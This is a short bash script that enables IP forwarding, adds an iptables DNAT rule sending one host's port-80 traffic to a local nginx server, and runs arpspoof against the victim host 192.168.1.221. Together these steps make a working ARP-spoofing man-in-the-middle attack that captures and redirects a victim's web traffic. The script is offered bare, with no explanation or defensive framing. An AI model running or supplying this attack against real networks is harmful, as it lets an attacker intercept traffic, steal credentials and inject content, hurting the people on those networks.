#! /bin/bash

sysctl -w net.ipv4.ip_forward=1
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 --source 192.168.1.221 --destination 192.168.1.222  -j DNAT --to-destination 192.168.1.64

if [ ! -d "/var/log/nginx" ]; then
  mkdir /var/log/nginx
fi

nginx -c /etc/nginx/nginx.conf &

arpspoof -i eth0 -t 192.168.1.221 192.168.1.222